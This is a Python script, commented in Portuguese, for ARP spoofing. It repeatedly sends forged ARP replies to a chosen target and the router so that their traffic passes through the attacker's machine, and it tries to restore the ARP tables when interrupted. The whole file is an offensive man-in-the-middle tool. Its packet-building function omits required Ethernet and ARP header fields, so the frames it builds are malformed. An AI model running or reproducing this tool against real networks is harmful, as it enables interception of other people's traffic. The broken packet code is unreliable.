import socket
import os
import struct
import time
import sys
import subprocess
import re
import platform

def get_local_mac(interface):
    """
    Obtém o endereço MAC local de uma interface de rede no Arch Linux.
    """
    # Verifica se o sistema é Linux
    if platform.system() == "Linux": 
        interface_path = f'/sys/class/net/{interface}/address'
        if os.path.exists(interface_path):
            try:
                with open(interface_path) as f:
                    return f.read().strip()
            except OSError as e:
                print(f"[!] Erro ao acessar o arquivo da interface {interface}: {e}")
                return None
        else:
            print(f"[!] Interface {interface} não encontrada.")
            return None
    else:
        print(f"[!] Sistema operacional não suportado: {platform.system()}")
        return None

def get_mac(ip):
    """
    Retorna o endereço MAC correspondente ao IP usando o comando `ip neigh`.
    """
    try:
        result = subprocess.check_output(['ip', 'neigh'], stderr=subprocess.DEVNULL).decode("utf-8")
        for line in result.splitlines():
            if ip in line:
                mac_address = re.search(r'([0-9a-fA-F]{2}(:[0-9a-fA-F]{2}){5})', line)
                if mac_address:
                    return mac_address.group(0)  # Exibe o endereço MAC
        print("Endereço MAC não encontrado")
        return None
    except subprocess.CalledProcessError as e:
        print(f"[!] Erro ao executar 'ip neigh': {e}")
        return None

def build_arp_packet(src_mac, dst_mac, src_ip, dst_ip, opcode=2):
    """
    Constrói um pacote ARP (operação 2 é para 'Reply').
    """
    packet = struct.pack("!6s6s2s4s4s", 
        bytes.fromhex(dst_mac.replace(":", "")),  # Destination MAC
        bytes.fromhex(src_mac.replace(":", "")),  # Source MAC
        struct.pack("!H", opcode),  # Opcode (2 = ARP Reply)
        socket.inet_aton(src_ip),  # Source IP
        socket.inet_aton(dst_ip)   # Destination IP
    )
    return packet

def send_arp_packet(interface, packet):
    """
    Envia o pacote ARP pela interface de rede especificada.
    """
    with socket.socket(socket.AF_PACKET, socket.SOCK_RAW) as sock:
        sock.bind((interface, 0))
        sock.send(packet)

def spoof_arp(target_ip, router_ip, interface):
    """
    Envia pacotes ARP spoofing para o target e o router.
    """
    target_mac = get_mac(target_ip)
    router_mac = get_mac(router_ip)

    if not target_mac or not router_mac:
        print("Erro ao obter MAC de um dos dispositivos.")
        return

    # MAC da interface de rede local (utilizado para gerar o spoof)
    local_mac = get_local_mac(interface)
    

    # Criação e envio dos pacotes ARP
    packet_to_target = build_arp_packet(local_mac, target_mac, router_ip, target_ip)
    packet_to_router = build_arp_packet(local_mac, router_mac, target_ip, router_ip)

    send_arp_packet(interface, packet_to_target)
    send_arp_packet(interface, packet_to_router)

def restore_default(target_ip, router_ip, interface):
    """
    Restaura as tabelas ARP dos dispositivos alvo e roteador.
    """
    target_mac = get_mac(target_ip)
    router_mac = get_mac(router_ip)

    if not target_mac or not router_mac:
        print("Erro ao restaurar as tabelas ARP.")
        return

    # MAC da interface de rede local (utilizado para gerar o spoof)
    local_mac = get_local_mac(interface)

    # Criação e envio dos pacotes ARP para restaurar
    packet_to_target = build_arp_packet(router_mac, target_mac, router_ip, target_ip, opcode=1)  # ARP Request
    packet_to_router = build_arp_packet(target_mac, router_mac, target_ip, router_ip, opcode=1)  # ARP Request

    send_arp_packet(interface, packet_to_target)
    send_arp_packet(interface, packet_to_router)

def main():
    if len(sys.argv) != 4:
        print("Uso: python3 script.py <IP_router> <IP_target> <interface>")
        sys.exit(1)

    router_ip = sys.argv[1]
    target_ip = sys.argv[2]
    interface = sys.argv[3]

    try:
        while True:
            spoof_arp(target_ip, router_ip, interface)
            time.sleep(2)
    except KeyboardInterrupt:
        print("[!] Processo interrompido. Restaurando as configurações padrão ...")
        restore_default(target_ip, router_ip, interface)
        exit(0)

if __name__ == "__main__":
    main()
